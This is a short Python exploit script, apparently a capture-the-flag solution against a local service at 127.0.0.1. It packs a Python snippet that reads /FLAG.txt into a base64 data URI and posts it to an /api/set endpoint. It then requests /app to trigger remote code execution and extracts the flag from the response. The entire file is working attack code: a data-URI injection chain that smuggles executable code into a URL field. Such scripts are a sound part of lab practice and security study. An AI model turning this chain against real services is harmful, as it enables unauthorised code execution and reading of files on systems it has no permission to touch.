import requests
import base64
import json

TARGET = "http://127.0.0.1:32905"

print("[*] SSRF Data URI Injection Test")
print(f"[*] Target: {TARGET}\n")

# Create malicious JSON payload
payload_dict = {"script": "open('/FLAG.txt').read()"}
payload_json = json.dumps(payload_dict)
print(f"[1] JSON payload: {payload_json}\n")

# Encode as data URI
payload_b64 = base64.b64encode(payload_json.encode()).decode()
data_uri = f"data:application/json;base64,{payload_b64}"
print(f"[2] Data URI: {data_uri}\n")

# Set data URI via /api/set
print("[3] Setting data URI via /api/set...")
set_response = requests.post(f"{TARGET}/api/set", json={"url": data_uri})
print(f"Status: {set_response.status_code}")
print(f"Response: {set_response.text}\n")

# Trigger RCE via /app
print("[4] Triggering RCE via /app...")
app_response = requests.get(f"{TARGET}/app")
print(f"Status: {app_response.status_code}")
print(f"Response: {app_response.text}\n")

# Extract flag
import re
flags = re.findall(r'FLAG\{[^}]+\}', app_response.text)
if flags:
    print(f"[!] FLAG FOUND: {flags[0]}")
else:
    print("[-] No flag found")

